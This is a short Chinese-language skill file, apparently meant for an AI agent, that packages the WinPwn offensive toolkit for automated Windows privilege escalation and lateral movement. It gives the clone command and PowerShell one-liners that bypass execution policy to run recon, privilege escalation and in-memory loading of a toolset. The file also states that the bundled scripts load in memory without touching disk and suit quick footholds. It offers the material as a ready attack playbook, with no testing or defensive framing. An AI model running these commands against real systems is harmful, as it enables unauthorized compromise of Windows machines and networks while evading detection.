---
name: winpwn-windows-auto
description: WinPwn: Windows 内网自动横向。信号:windows提权,uac绕过,交互菜单,本地提权,内存加载工具集。
---

# WinPwn

- 攻击大类:C17 Windows本地提权
- 上游仓库:https://github.com/S3cur3Th1sSh1t/WinPwn
- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/S3cur3Th1sSh1t/WinPwn
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `powershell -ep bypass -c '. ./WinPwn.ps1; menu'` | 交互菜单 |
| `WinPwn -noninteractive -consoleoutput -LocalPrivEsc` | 本地提权 |
| `-PowerSharpPack` | 内存加载工具集 |
| `-Help` | 见上游文档 |

## 攻击场景 Playbook

### Windows 内网自动横向

```bash
powershell -ep bypass -c '. ./WinPwn.ps1; WinPwn -consoleoutput -noninteractive -LocalRecon -PrivEsc -PowerSharpPack'
```

## 注意事项

聚合 PowerSploit/PowerUp/PowerView 等 40+ 脚本,内存加载不落盘;适合快速打点。
